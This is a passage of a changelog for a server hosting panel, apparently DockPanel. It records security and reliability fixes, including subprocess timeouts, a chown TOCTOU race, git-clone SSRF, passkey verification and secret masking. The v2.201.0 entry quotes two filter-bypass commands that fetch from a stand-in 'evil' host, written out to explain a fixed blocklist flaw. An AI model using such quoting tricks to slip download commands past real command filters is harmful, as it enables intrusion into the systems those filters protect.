+close. Fixed to mirror `deploy.rs::hand_tree_to_web_user`'s existing split: chown
+everything except `.git` to `www-data`, then explicitly re-secure `.git` to `root`. This
+is 1 of 8 `.git`-blind recursive chowns tracked since s377/p108 across the agent crate —
+the other 7, in different files, remain open and are filed as a future rotation target.
+
+**Also reviewed and found sound, no fix needed:** classic tar symlink-directory escapes
+and a `tar --wildcards` metacharacter trick were both proven blocked by GNU tar's own
+default protections (execution-verified, not just read); `secure_backup_tree()`'s
+permission-repair timing was proven to leave no live `www-data`-reachable window, since
+the tree's root directory bit stays `0700` continuously from first boot.
+
+5 new unit tests (2 for the archive-parsing guards, mutation-tested), 12 new pin
+assertions (9 kill_on_drop sites + the `.git`-skip chown, `tests/timeout-orphan-kill-on-drop-pin-e2e.sh`
+29 → 41). See `project_dockpanel_tech_debt_p192` for the full account, including the
+UPHELD/RESIZED verdicts on every finding and the carried debt (per-domain Restic
+passwords, the dangling-symlink-on-failed-restore residue, the remaining 7 `.git`-blind
+chown sites, a pin-coverage gap for the permission-timing invariant).
+
+## [2.206.0]
+
+### Fixed — WordPress toolkit: hardening checks could grade a config "pass" while it was actually insecure, and every wp-cli/tar subprocess in the file could be orphaned by a timeout
+
+From the s452 `dockpanel-fanout` audit of `panel/agent/src/services/wp_vulnerability.rs`
+(picked as this session's rotation target per [[feedback_dockpanel_audit_scope]]'s
+pre-selection check, after `deploy.rs` and `ssl.rs` — both zero in-file citations —
+turned out to carry substantial undocumented prior scrutiny under the "zero mentions"
+heuristic).
+
+**A hand-authored `wp-config.php` with a conditional `define()` (`if (…) { define('X', true); }
+else { define('X', false); }`) could report the dead branch's value as the live one.**
+`wp_constant()` picked the textual-first match with no control-flow awareness, so a
+site whose *running* value was insecure (e.g. `DISALLOW_FILE_EDIT` actually `false`)
+could still show a green "pass" if the `true` branch happened to be written first —
+the panel's own hardening-verification checks, silently wrong in the unsafe direction.
+Fixed: a same-named constant defined more than once with `if`/`elseif`/`else` syntax
+between the occurrences now grades as unverifiable (fails safe) rather than trusted —
+the existing `ConstValue::Expr` "cannot verify, never a pass" machinery every check
+already used for other unparseable cases. A plain accidental duplicate define with no
+conditional between the two occurrences is unaffected (PHP's own first-wins rule still
+applies there, unchanged).
+
+**None of the crate's wp-cli/tar/sudo subprocesses in this file set `kill_on_drop(true)`,
+and the crate's single wp-cli choke point (`wp_at_root`, which every WP operation in the
+panel funnels through — including all three `wp_vulnerability.rs` entry points) had no
+timeout at all.** Same class as the `kill_on_drop` gaps fixed in v2.204.0/v2.205.0, just
+never reaching this file: `grep -n kill_on_drop` over `wordpress.rs` returned nothing
+before this fix, and the existing pin suite never scanned it. Fixed at 6 sites: `wp_at_root`
+(now timeout-bounded at 600s + `kill_on_drop`), `install()`'s two hand-rolled wp-cli calls
+(predate `wp_at_root`, same fix applied directly), and 3 sites that already had a timeout
+wrap but were still missing `kill_on_drop` — `create_update_snapshot`'s and
+`rollback_from_snapshot`'s tar, and `health_check`'s sudo'd wp-cli eval.
+
+**`wp_hardening`, a DB table from the same migration as `wp_vuln_scans`, had zero writers
+and zero readers anywhere in the tree** (completeness-critic finding, off the original
+menu) — every hardening check has always been a pure live round-trip with no persisted
+history. Fixed: `security_check`'s backend handler now upserts one row per check into
+`wp_hardening` on every call, mirroring the write `vuln_scan` already does into its
+sibling table.
+
+Extended `tests/timeout-orphan-kill-on-drop-pin-e2e.sh` 22→29 assertions (new section H:
+the 6 `wordpress.rs` sites; extended section I: reachability for its routes). All 6 new
+sites individually mutation-tested (reverted one at a time, confirmed exactly its own
+assertion goes red, restored). Added 5 new unit tests for the conditional-`define()` fix,
+including one end-to-end through `check_security()`.
+
+**Not fixed this session, filed as tech debt:** the stale (~2.5-3yr-old), hardcoded
+14-plugin vulnerability database and its lack of an in-product staleness caveat (a
+structurally correct fix needs a live/synced feed, not a version bump that would just
+re-stale later); a narrow `version_lt()` segment-shift false negative (needs a
+non-numeric qualifier sitting between two numeric groups — realistic only for
+premium/beta plugin builds); the `harden`/`update-with-rollback` race (no per-site lock
+anywhere in the agent — a rollback can silently undo a hardening write with no
+re-verification and no notification). The tenant-isolation/authorization path for all
+three `wp_vulnerability.rs` entry points was audited and found already correct — the
+backend re-derives site ownership and domain from an owned row before ever calling the
+agent, the same pattern already fixed in `backup_orchestrator.rs`.
+
+## [2.205.0]
+
+### Fixed — a timed-out database restore or mailbox restore could keep writing after the panel reported failure
+
+From the s451 `dockpanel-fanout` audit of `panel/agent/src/services/database_backup.rs`
+(the first PRIMARY pass over this file), rotation-picked per
+[[feedback_dockpanel_audit_scope]] after v2.204.0's own new pin suite was
+found to falsely claim this file was already covered.
+
+**5 of the file's 6 privileged dump/restore functions never set
+`kill_on_drop(true)` on their child processes** — only `dump_mongo` did.
+On an actual 600s timeout, the spawned `mariadb-dump`/`pg_dump`/`mariadb`/
+`psql`/`mongorestore` process (and its paired `gzip`/`gunzip`) kept running,
+orphaned, after `tokio::time::timeout` returned. For a **restore**, this is
+worse than a stale file: the underlying client keeps writing into a live
+customer database after the panel has already reported the restore as
+failed, so an operator who retries — or takes a different recovery action —
+risks a data-corrupting concurrent-write race against the original restore
+silently finishing in the background. Fixed at all 9 call sites
+(`dump_mysql`/`dump_postgres` each spawn 2 children — docker+gzip;
+`restore_mysql`/`restore_postgres` each spawn 2 — gunzip+docker;
+`restore_mongo` spawns 1 — docker), matching the pattern already used
+by `dump_mongo` and re-applied crate-wide in v2.204.0. Folded in the same
+pass: `dump_mysql`/`dump_postgres` piped the docker child's stderr but never
+drained it (`.wait()` instead of `.wait_with_output()`), which could hang a
+dump on unusually verbose `mariadb-dump`/`pg_dump` output until the same
+timeout — now drained like every sibling call site already does.
+
+**The completeness critic found the identical bug, off the original menu,
+in an unrelated file**: `panel/agent/src/routes/mail.rs`'s `mailbox_backup`/
+`mailbox_restore` (`tar czf`/`xzf` under a 300s timeout) — invisible to
+every earlier "grep `services/` for `kill_on_drop`" sweep because this
+feature's subprocess logic is inlined directly in the route handler, not a
+service module. This file has exactly one commit in its entire history (it
+created the whole mail-hosting feature at v2.173.0) and had never been
+touched by any audit since — 38 releases. On a mailbox large enough that
+`tar` exceeds 300s, the orphaned process kept extracting into
+`/var/vmail/{domain}` after the panel reported failure, skipping the
+ownership-repair step that follows a successful restore. Fixed with the
+same pattern.
+
+Verification: 22 pin assertions (was 9 — the suite's own header previously,
+incorrectly, claimed this file needed none), all 11 new sites individually
+mutation-tested. `cargo test`: agent 299/0/4-ignored, backend 473/0
+(unchanged). Full local pin sweep 117/117.
+
+## [2.204.0]
+
+### Fixed — NodeSource/Cloudflared repo cleanup left trust behind on every routine uninstall, and six timed-out privileged operations could orphan past their deadline
+
+From the s450 `dockpanel-fanout` audit of `panel/agent/src/services/pkg.rs`
+(the package-manager abstraction behind every `apt-get`/`dnf`/`yum`
+operation the agent runs as root) — the first PRIMARY pass over this file.
+
+**`remove_repo()` never deleted what `add_repo()` actually leaves behind,
+on the ordinary successful "Uninstall" path, not just a failed install.**
+Verified live against the real upstream scripts (`deb.nodesource.com` and
+`rpm.nodesource.com`'s `setup_22.x`): NodeSource additionally writes a
+keyring, a DEB822 `.sources` file, and two `Pin-Priority: 600` files that
+outrank a normally-installed package, none of which the old cleanup path
+touched; the RPM side leaves a second `.repo` file behind; Cloudflared's
+own keyring was never deleted either. The practical effect: a deliberately
+uninstalled NodeSource repo kept silently redirecting every LATER,
+unrelated `apt-get install` (e.g. as another package's dependency) to
+`deb.nodesource.com` instead of Debian's own archive — directly
+contradicting this file's own comment that a half-added repo "must leave
+nothing behind." The cleanup list now tracks upstream's real footprint;
+deliberately not attempted is revoking the RPM-imported GPG trust-store
+entry, since there is no file on disk to remove and matching the right key
+by heuristic risks revoking one another active repo still relies on.
+
+**Six call sites wrapped a privileged subprocess in a timeout without ever
+calling `.kill_on_drop(true)` on the `Command`** — the exact class already
+fixed in five sibling files, missed here. When the timeout fires and the
+Rust future is dropped, tokio's documented default leaves the child
+process running, orphaned, reparented to PID 1, entirely unbounded by the
+deadline that looked like it would stop it. Reproduced live: an orphaned
+`git fetch`/`git clone` leaves `.git/index.lock`, and the very next
+deploy/clone attempt on the same site — including an operator's ordinary
+immediate retry — fails instantly with a generic, non-actionable "Another
+git process seems to be running" error rather than succeeding or
+surfacing the real cause. Fixed in `git_build.rs` (both legs of
+`clone_or_pull`), `deploy.rs` (its own, independent second implementation
+of `clone_or_pull`), `backups.rs` (the staged `tar czf`), and
+`remote_backup.rs` (`s3_curl`, the one runner behind every S3 operation).
+
+`pkg.rs`'s own `systemd-run --wait`-backed timeout is a related but harder
+problem — proven live that killing the local waiting client has no effect
+on the remote transient unit it started — and is carried forward as sized
+tech debt rather than fixed in this pass; see `project_dockpanel_tech_debt`
+for the account.
+
+## [2.203.0]
+
+### Fixed — repair-walk TOCTOU, manual-prune data loss, auto-healer mid-recreate race, and 4 more from the docker_apps.rs carry list (E–I)
+
+The E–I sized carries from the s446 `docker_apps.rs` fan-out
+(`project_dockpanel_tech_debt_p185`/`p186`), picked up after last session's
+fresh-VPS drive verified the fix list's own prerequisite (carry J, GitHub
+#110).
+
+**F — the ownership-repair walk had a TOCTOU race between listing a
+directory and reading it.** `chown_root_owned_entries` (the #110 repair
+mechanism) called `symlink_metadata` to confirm an entry was a root-owned
+directory, then separately called `read_dir` on the same path — re-resolving
+it a second time. A process with write access to its own bind-mounted
+volume (every app has this, by construction) could swap the directory for a
+symlink to anywhere on the host in the window between the two calls, and
+the walk would follow it, `lchown`ing whatever it found there to the app's
+own uid. Rewritten around `openat`/`fstatat`/`fchownat`, all
+`O_NOFOLLOW`/`AT_SYMLINK_NOFOLLOW`: every lookup resolves at most one path
+component, always against an already-open, already-verified parent file
+descriptor, so there is no point in the walk where a name is looked up from
+`/` a second time. Also closes a related gap: a root-owned entry with more
+than one link (`fs.protected_hardlinks=0` on some fleet members lets an
+unprivileged process hardlink to a file it does not own) is now skipped
+rather than chowned, since chowning a shared inode repaints every name
+pointing at it, not just the one inside the volume.
+
+**E — the manual "prune unused images" button could delete git-deploy
+rollback images and snapshots with no way to get them back.** `docker image
+prune -af` widens the sweep from dangling (untagged) images to every image
+not backing a running container — including `dockpanel-git-<name>:<hash>`
+(the rollback target `deploy_or_update` falls back to, with no pull
+fallback) and `dockpanel-snapshot:*` (manual operator snapshots). The
+project's own unattended-reclaim path already forbids `-a` for exactly this
+reason (pin C4); this was the one door that didn't. Fixed to mirror the
+scoped reclaim exactly — no `-a`, plus the same
+`label!=dockpanel.managed=true` filter.
+
+**G — none of the three recreate doors (Update/change-image/edit-env)
+recorded an expected stop, so the 120s auto-healer could revive a container
+mid-recreate.** A container being remove-then-created for an update is
+genuinely absent or exited for part of that window even though nobody
+asked it to stay down; without a recorded expectation, `auto_healer`'s
+restart loop can race the agent's own `docker create`, producing a torn
+`docker cp`. Recorded BEFORE the agent call starts (the opposite of every
+other reason this table holds, which record only after a stop has already
+succeeded — here the whole point is to interrupt a running container on
+purpose) and cleared unconditionally once the call returns, success or
+failure, on all three doors.
+
+**H — the seeder that restores an image's shipped content into a bind
+mount ignored the ustar `prefix` field and dropped hardlinks.** POSIX
+ustar splits a path over 100 bytes across `name` and a `prefix` field;
+reading `name` alone silently truncated or misplaced any seeded path past
+the limit. Hardlink entries (busybox's applets are the common shape) were
+silently dropped entirely. Fixed: paths join `prefix`+`name` when a prefix
+is present; a hardlink resolves its `linkname` only against a path this
+same archive has already written — never the host filesystem, which would
+otherwise hand the extractor a host-read primitive via a dangling
+linkname.
+
+**I — honesty/consistency bundle:**
+- The Dozzle sidecar's ACL comment claimed `CONTAINERS=1` grants only
+  container-listing; it is actually a path-prefix grant over the whole
+  `/containers/*` family, also reaching `archive`/`export`/`attach`/
+  `changes`/`top` — none of which Dozzle calls. Comment corrected to say
+  so; the sidecar's `docker-socket-proxy` image is now pinned to `v0.5.0`
+  (verified equal digest to the `:latest` it replaces) rather than
+  floating, a prerequisite for ever narrowing the ACL further with a
+  custom haproxy.cfg.
+- The agent-side compose parser declared a `security_opt` field "parsed so
+  we can explicitly reject" dangerous options, but never actually read
+  it — `seccomp:unconfined`/`apparmor:unconfined` passed straight through
+  to a stack deployed via the agent's own compose door. The backend's
+  separate validator already catches this; the agent must not rely on
+  that alone, since it is a second machine reachable over its own HTTP
+  API. Now rejected at the agent too, matching the backend's exact rule.
+- `compose_validate` said a stack was simply "valid" even when it declared
+  `user:`/`healthcheck:`/`entrypoint:` — none of which this deployer has
+  ever read — silently dropping the directive at deploy time with no
+  warning given at validate time. Now flagged.
+- Exposing a domain writes to whichever path `vhost_target` picks (a
+  disabled domain's write goes to the PARKED path, invisible to nginx);
+  removing an app only ever checked the live path, so an app removed
+  while its domain happened to be disabled permanently stranded its
+  parked vhost file — silently unreclaimable. `unexpose_domain` now
+  checks and removes both paths `vhost_target` can produce, using the
+  same ownership check on each (the parked body is a frozen copy of the
+  same rendered vhost, so its `proxy_pass` still names the container's
+  port).
+- The Invoice Ninja template bound `/var/app/{public,storage}` — confirmed
+  against the live image (`invoiceninja/invoiceninja:5`, pulled and
+  inspected) that no such path exists; the real app root is
+  `/var/www/app`. Every deploy silently seeded nothing.
+
+Two items from the same carry list were sized and deliberately NOT touched
+this session, because the right fix is a design decision rather than a
+mechanical one: ad-hoc compose deploys (no `stack_id`) all resolve to the
+same literal `"adhoc"` scope, so two unrelated ad-hoc stacks declaring a
+same-named volume silently share one Docker volume — fixing this by
+minting a unique per-deploy scope would break idempotent re-deploy of the
+same paste, which may be relied on. And the backend's volume-backup
+executor's volume leg is dead twice over (`as_array()` on a
+`{"volumes": [...]}` object always returns `None`; the per-volume object it
+would then read has no `name` field, only `source`/`destination`) — moot
+today (0 policy rows exist), but the deeper question of what "volume
+backup" should even mean for the bind-mounted apps this panel actually
+deploys needs answering before either bug is worth fixing in isolation.
+`container_policies` (no bindable subject — only `deploy` reads it,
+admin-only) is unchanged, filed as design debt.
+
+Pin coverage: 3 existing suites extended
+(`registry-ollama-arg-validation-pin-e2e.sh` +3,
+`app-volume-ownership-pin-e2e.sh` +3, `expected-stop-pin-e2e.sh` +4,
+`compose-stack-pin-e2e.sh` +7), 2 widened rather than extended
+(`app-template-images-pin-e2e.sh`, `rhel-site-creation-pin-e2e.sh`), plus 4
+new Rust unit tests — all mutation-tested (each arm confirmed red against
+the exact regression it exists to catch, then confirmed green again). Full
+local pin sweep 116/116; `cargo test` 295/0/4-ignored (agent, +8 from
+baseline), 473/0 (backend, unchanged); `cargo audit` unchanged (agent 2,
+backend 1, cli 0).
+
+## [2.202.1]
+
+### Fixed — CI's own test suite has been red since v2.201.0
+
+`safe_cmd.rs`'s `DockerEnvFile` (the 0600 `--env-file` credential guard
+v2.201.0 shipped) and the older `Capture` (systemd-run stdout/stderr
+staging) both write under the hardcoded production path
+`/var/lib/dockpanel/run`. Their tests call that same code directly, so on
+GitHub Actions' unprivileged runner — which cannot `create_dir_all` under
+`/var/lib` — 4 `DockerEnvFile` tests have failed with `PermissionDenied` on
+every push since v2.201.0's release, silently, because the CI run that
+introduced the bug wasn't followed by a session that checked CI status
+before its next push. Not a production defect: this box (and every real
+install) runs the agent as root with `/var/lib/dockpanel` already present,
+so nothing shipped was ever broken. Fixed with a `capture_dir()` resolver
+that returns the real path in production and a scratch temp directory
+under `cfg!(test)` — using the `cfg!()` macro rather than a `#[cfg(test)]`
+attribute deliberately, since an attribute would have planted a second,
+earlier `#[cfg(test)]` token ahead of this file's real test module and
+blinded every pin suite that stops reading a file at the first one.
+Verified both ways: `cargo test` (debug, matching CI) and `cargo test
+--release` both green, full local pin sweep 116/116.
+
+## [2.202.0]
+
+### Fixed — docker_apps.rs fan-out: 4 findings fixed (Update/change-image/edit-env, env mask, registry pulls, remove_image)
+
+`dockpanel-fanout` against `panel/agent/src/{routes,services}/docker_apps.rs` (the
+standing top candidate named in `feedback_dockpanel_audit_scope` — the single
+largest file in the agent crate, 86 all-time commits, and the file behind
+GitHub #110). The surface turned out to be admin-only end to end (45/46
+backend handlers `require_admin`, no app-ownership predicate exists anywhere),
+so every finding here is admin-self-harm or prospective — nothing tenant-reachable.
+
+**A dropped client connection cancelled Update / change-image / edit-env
+mid-recreate, between `remove_container` and `create_container` — the app's
+container vanished, leaving only its bind-mounted data behind.** All three
+agent handlers ran the recreate inline on the request's own connection task,
+and two of the three matching backend handlers (`update_env`, `update_image`)
+did the same rather than spawning like `update_app` already did.
+demo.dockpanel.dev is Cloudflare-proxied with a ~100s origin budget, well
+inside the 900s these calls are allowed to take, so this was routine rather
+than rare. Fixed by wrapping every one of the five calls in
+`tokio::spawn(...).await` — the spawned task now outlives a dropped
+connection because it is scheduled onto the runtime independently of the
+future awaiting its `JoinHandle`.
+
+**`GET /apps/{id}/env` returned 8 catalogue-declared secrets in the clear.**
+The mask was a substring heuristic (PASSWORD/SECRET/KEY/TOKEN/CREDENTIAL/AUTH)
+that never consulted the catalogue's own `secret: true` flag, so a name like
+`DB_PASS`, `POSTGRES_PWD`, `SURREAL_PASS`, `GOTIFY_DEFAULTUSER_PASS`,
+`PLEX_CLAIM`, `DATABASE_URL`, `CLICKHOUSE_DATABASE_URL`, or
+`REDASH_DATABASE_URL` — none of which contain one of those substrings — was
+returned unmasked. Fixed with a `catalogue_secret_env` lookup OR'd into the
+route's mask condition.
+
+**Registry login was inert for every panel-initiated image pull.**
+`GET /apps/registries` read a hardcoded `/root/.docker/config.json`, while
+every `docker` CLI call (including `docker login`) runs with
+`DOCKER_CONFIG=/var/lib/dockpanel/docker` — so the panel's "Configured
+registries" list was always empty, and separately, all four production
+`create_image` pulls (template deploy, app update, change-image, compose
+deploy) always passed `credentials: None`, so a private-image deploy failed
+even immediately after a successful login. Fixed by pointing
+`list_registries` at the directory `DOCKER_CONFIG` actually uses, and adding
+a `registry_credentials_for` lookup wired into all four pull sites.
+
+**`DELETE /apps/images/{id}` accepted a leading dash.** The charset check
+allowed every character `docker rmi --help` needs, so that request ran the
+help flag and returned `success: true`. Fixed with a leading-dash guard,
+matching the existing sibling validator on `change-image`'s `image` field.
+
+## [2.201.0]
+
+### Security — agent-crate fan-out: 2 findings, both fixed
+
+`dockpanel-fanout`'s first PRIMARY run against `panel/agent/src/{routes,services}`
+(81 files, ~52K LOC — the standing gap named in `feedback_dockpanel_audit_scope`;
+every prior rotation had only ever picked candidates from `panel/backend`). Two
+findings, both confirmed live before shipping.
+
+**Site-terminal / cron command blocklist bypassed by ordinary shell quoting.**
+`command_filter.rs` matched `curl`/`wget`/`su`/`docker`/etc. as a literal substring
+of the raw typed text — but `cu''rl -o /tmp/p http://evil` and `w\get -qO- http://evil`
+contain no such substring, and `bash --restricted --norc --noprofile` (the exact
+invocation the site terminal spawns) removes the quotes/backslash before exec and
+runs the real binary. Reproduced live against that exact invocation before fixing.
+Fixed by normalizing quote/backslash characters out of the command string before
+every blocklist and suspicious-activity check (terminal, cron, and the alerting
+path all shared the same gap). Documented, not fixed here: a deeper class where a
+value assembled across TWO lines in the same persistent shell session (a variable
+set on one line, read on the next) still evades any single-line filter — an
+architectural gap, not a blocklist patch; recorded for a future session.
+
+**Tenant database passwords passed as literal `docker exec`/`docker run` command-line
+arguments** (`-e MYSQL_PWD=...`, `-e PGPASSWORD=...`) across `database.rs` and its
+three backup/restore/verify/drill siblings (25 call sites, 4 files) — `/proc/<pid>/
+cmdline` is world-readable on every install this agent targets, so any local process
+(concretely: a terminal session that just exploited the bypass above) could read
+another tenant's live database password for the lifetime of the docker child. Fixed
+by moving every credential into a fresh 0600 `--env-file` (`DockerEnvFile`, written
+immediately before use, removed on drop) instead of `-e KEY=value` argv — the CLI's
+own argv now carries only a filesystem path, never the secret.
+
+## [2.200.0]
+
+### Fixed — migration/staging/oauth fan-out audit: 13 findings, all fixed
+
+The standing rotation's next-untouched-file menu (`migration.rs`/`staging.rs`/`oauth.rs`)
+went through a full census + adversarial-skeptic + completeness-critic fan-out. Every
+UPHELD finding was fixed the same session; the two most severe were things the census
+itself didn't originally ask about.
+
+**Staging never isolated the database, despite promising to.** `/staging/clone` only
+ever rsyncs files (confirmed by reading every line of the agent's staging surface) — for
+any DB-backed site (WordPress, Laravel, anything with a `databases` row), "Create
+Staging" put the operator on a UI that says "test changes before going live" while
+actually reading and writing the LIVE production database from the first click. Fixed by
+disclosure + a block: creating staging for a site with an attached database now refuses
+with a clear message unless the caller explicitly acknowledges it
+(`acknowledge_shared_database`), and the UI copy no longer implies the database is
+covered. Real database cloning is a larger feature (raises its own question — does "Push
+to Prod" sync the database back, and how? — deliberately not answered here) and stays
+open as future work.
+
+**Staging has 500'd on every proxy/node/python site since the day the fix that broke it
+shipped (s375, 69 sessions ago).** `staging::create` bound the parent's own `proxy_port`
+onto a new row sharing the parent's `server_id`, and `idx_sites_proxy_port_server` is
+UNIQUE on `(proxy_port, server_id)` — so the INSERT always collided with the parent's own
+row. Diagnosed once, filed, and then lost when the register that held it retired without
+ever being promoted. Fixed by allocating staging its own free port (same allocator
+`sites::create` already uses for node/python) instead of copying the parent's. The same
+gap silently existed for `app_command` — staging never sent it at all, so a staged
+node/python app's process never actually started; fixed alongside the port.
+
+**Security — oauth.rs: an account already linked to one provider could be logged into by
+a second, different provider.** The linking check only tested *whether* `oauth_provider`
+was set, never *which* provider — contradicting its own comment. Fixed with an explicit
+provider-identity check.
+
+**Security — staging's `destroy()` released a domain claim even when file cleanup
+failed**, leaving the previous tenant's files (potentially `.env`/`wp-config.php`) on
+disk under a domain anyone could immediately reclaim. The DB row — the only thing that
+marks a domain occupied — is now kept (status `error`) until file cleanup actually
+succeeds.
+
+**Migration import silently produced broken sites for its own dominant case.** Every
+non-static site imported via the migration wizard got an nginx config with no
+`php_socket`/`proxy_port`/`app_command` — for PHP (the modal outcome for cPanel/Plesk/
+HestiaCP archives) this rendered a socket path that doesn't exist under this project's
+own PHP-FPM naming convention; for node/python it defaulted to a meaningless port. Fixed:
+PHP imports now resolve a real, running PHP-FPM version from the server; node/python
+imports (whose port and start command genuinely cannot be derived from a file-tree scan)
+skip vhost creation entirely rather than serve a wrong config or the app's raw source,
+and are clearly marked as needing manual configuration.
+
+**Migration's database-port allocator raced with itself and with `POST /databases`**,
+because it called the agent to create the container BEFORE inserting the row that claims
+the port — the opposite order from `databases::create`'s own comment ("insert first to
+atomically claim the port"). Reordered to match; a losing racer now gets a clear
+"claimed by a concurrent operation, retry" message instead of an opaque Docker bind
+failure.
+
+Plus, all lower-severity: an unscoped `DELETE FROM migrations` (every other statement in
+the file filters `user_id`; this one didn't, though nothing exploitable reached it
+today); a Google OAuth login stored `oauth_id` with its JSON quote characters still
+attached (dead data, never read back, but wrong); `oauth.rs`'s account auto-link and
+auto-create never wrote an activity-log row, unlike every other mutation in the file and
+unlike the password registration path it sits beside; `oauth.rs` leaked raw
+`reqwest`/`serde_json`/`jsonwebtoken` error text to the client instead of using the
+`upstream_error`/`internal_error` helpers it already imports and uses elsewhere in the
+same file; and a duplicate-staging TOCTOU race (the existing check-then-insert had no
+backing constraint) now has one — `idx_sites_parent_unique`, migration
+`20260901010000_staging_parent_unique.sql`.
+
+One finding was investigated and deliberately NOT fixed: adding `record_suspicious_event`
+to oauth's CSRF-failure path (the natural-looking fix for "no security-audit-log entry on
+a login-CSRF attempt") would let any anonymous visitor trigger a system-wide five-minute
+lockdown with five bad requests — the exact self-DoS `passkeys.rs` already documents
+avoiding for the same reason. Left as-is, with a comment explaining why.
+
+## [2.199.0]
+
+### Security — passkey login now enforces user verification, for any credential that ever proved it could give one
+
+Passkey sign-in has always skipped the separate TOTP step (the passkey *is*
+the second factor) — but nothing checked whether the passkey ceremony itself
+had actually verified its holder. WebAuthn's User Verification (UV) bit
+distinguishes a PIN/fingerprint/face check from mere presence (a touch), and
+`auth_complete` never read it. A physical security key with no PIN set, or
+one simply borrowed for a moment, was a complete bypass of both factors at
+once: possession alone minted a full session.
+
+Fixing this at the login door unconditionally would have been retroactive —
+locking out every already-enrolled PIN-less roaming key on every install,
+with no way to tell which ones could ever satisfy it. Instead: a new
+`uv_capable` column on `passkeys` (migration
+`20260901000000_passkey_uv_capable.sql`, `DEFAULT FALSE`) records, once, at
+registration, whether that ceremony's own authenticator performed
+verification. `auth_complete` now requires the UV bit back on every future
+login for that credential — but *only* for a credential whose `uv_capable`
+is `true`. Every pre-existing row, and every authenticator that has never
+demonstrated verification, keeps working exactly as before: this is a
+per-credential guarantee, not an account-wide switch, and nothing already
+enrolled is newly locked out. `register_begin`'s WebAuthn hint deliberately
+stays `user_verification: "preferred"` rather than `"required"` — forcing it
+would fail registration outright for a PIN-less key, closing the documented
+sole-administrator recovery path (`docs/guides/security-hardening.md`'s own
+"register a passkey" advice) this exists to protect.
+
+The UV check runs after signature verification, for the same reason the
+existing clone-counter check does: the flags byte is covered by the
+signature, so trusting it earlier would let an attacker learn a credential's
+verification requirement from a forged, unauthenticated assertion. A
+refusal records a login attempt and an audit row (`passkey.uv_not_provided`),
+without routing through the panel-wide lockout trigger.
+
+**My Account** now shows each passkey as **Verified** or **Possession-only**
+(`list_passkeys` returns `uvCapable`), so an account owner can see which of
+their keys carry the stronger guarantee and re-register a possession-only
+one if they want it.
+
+New: `panel/backend/src/bin/passkey_virtual_authenticator.rs`, a standalone
+WebAuthn client+authenticator (independent of the server's own code — real
+P-256 keys, hand-built CBOR/authenticatorData, real ECDSA signatures) that
+drives the actual HTTP ceremony end to end against a live instance, proving
+the enforcement and the grandfathering both hold. Run via
+`tests/passkey-uv-enforcement-e2e.sh` (a new EXECUTE-class suite, alongside
+`nginx-headers-pin-e2e.sh`/`update-rollback-pin-e2e.sh` — needs a live box,
+not pure source analysis; cleans up every credential it plants regardless of
+outcome).
+
+`tests/passkey-ceremony-pin-e2e.sh` grows a new §I (8 assertions: the
+migration, the derivation, storage, retrieval, check ordering, the refusal's
+side effects, the deliberate non-change to `register_begin`'s hint, and
+`list_passkeys` exposing the new field) and §G4 flips from pinning the
+absence of enforcement to pinning its presence — 26 → 34 assertions. All
+new/changed arms verified via full revert (source stashed, all correctly
+went red) and, for the two absence/context arms, a targeted decoy mutation
+confirming each fires in isolation.
+
+## [2.198.1]
+
+### Fixed — Dashboard: Updates tile not clickable, Active Issues width, dot/text misalignment
+
+Three cosmetic/UX reports against the Dashboard, all in `Dashboard.tsx`:
+
+- The **Updates** stat tile was a plain `<div>` while its siblings (Docker,
+  Health, Alerts, SSL, Incidents, Backups) were all `<Link>`s. It now links to
+  `/updates`, with the same warn-tint-when-actionable treatment as Alerts/
+  Incidents/Backups.
+- **Active Issues** read narrower than **Recent Activity** or
+  **Recommendations** whenever the adjacent **SSL Certificates** panel had
+  nothing to show: both panels shared a `grid-cols-2` row, and CSS grid does
+  not stretch a lone child to fill an empty second column. The row now spans
+  a solo panel across both columns (`lg:col-span-2`) when only one of the two
+  has content, and keeps the existing side-by-side layout when both do.
+- The severity dots in **Active Issues** and **Recommendations** sat visibly
+  below their text's optical center (`mt-1.5` on an 8px dot against
+  `text-xs leading-tight`, measured via a headless-browser harness against
+  the actual compiled Tailwind output: dot center 4px below the first
+  line's center in both places). Changed to `mt-0.5`, verified to land the
+  two centers exactly on top of each other.
+
+`tests/carry-sweep-pin-e2e.sh`'s H6 (the SSL-countdown-must-not-ride-the-
+Active-Issues-switch pin) and `tests/client-role-honesty-pin-e2e.sh`'s A6
+(the Updates-cell-must-stay-admin-gated pin) both updated to match: H6 split
+into H6a/H6b to verify the new single-source-of-truth `showSsl` shape (a
+strictly stronger guarantee — the old duplicated-literal shape could drift
+between its two copies, this one cannot by construction), and A6's
+proximity threshold widened from 260 to 300 chars to admit the Link's
+legitimately longer conditional className while staying far tighter than
+neighboring thresholds. Both re-verified via full revert and targeted decoy
+mutation.
+
+## [2.198.0]
+
+### Fixed — escalation-policy notification-relay abuse; agent-side git-clone SSRF/DNS-rebind gap; secrets masking panic
+
+Three findings from a fresh `dockpanel-fanout` round targeting
+`auth.rs`/`secrets.rs`/`files.rs`/`git_deploys.rs`/`databases.rs`, plus two
+new-surface finds its completeness and setup critics surfaced outside that
+menu:
+
+`panel/backend/src/routes/escalation_policies.rs`'s `user:<uuid>`
+escalation-policy route step was validated only as a UUID shape, unlike its
+`on_call_schedule:<uuid>` sibling, which got an ownership check at v2.185.0
+(s437). Any admin could discover another user's UUID via `GET /api/users`
+(intentionally unscoped — a shared admin directory), save a policy with a
+`user:<victim>` step, attach it to an alert rule they own, and trigger it —
+delivering the alert to the victim's real email/Slack/Discord/PagerDuty/
+webhook with no consent and no way to trace who set it up.
+`validate_user_routes` now requires a `user:` target to be the caller
+themselves or a user they directly manage (`reseller_id = caller`), the same
+shape used everywhere else in the codebase for "which users does this admin
+manage."
+
+`panel/backend/src/helpers.rs::validate_repo_url_not_internal` checks a git
+deploy's `repo_url` for SSRF — but on the panel host, at write time. The
+actual `git clone` runs later (immediately, on a scheduled pull, or on a
+redeploy), on a *different* host — the fleet member running
+`panel/agent` — via a plain subprocess with no validation of its own. A DNS
+answer that differs between "how the panel resolved this hostname" and "how
+the fleet member resolves it right now" sailed straight through. Reachable
+via three independent, previously-unguarded agent code paths:
+`git_build.rs::clone_or_pull` (`/git/clone`), `deploy.rs::clone_or_pull`
+(`/deploy/run`), and `deploy.rs::atomic_deploy` (`/deploy/atomic`, its own
+inline clone). All three now resolve and reject an internal/private target
+via a new `ssrf_guard` module immediately before invoking `git`, closing the
+unbounded cross-host TOCTOU window down to the same narrow same-host,
+same-instant window this codebase already accepts for `check_tcp`/
+`check_ping`.
+
+`panel/backend/src/routes/secrets.rs`'s `mask_value` sliced the first 4
+*bytes* of a secret's value for display. Rust panics if that byte offset
+doesn't land on a UTF-8 character boundary — reachable from any secret
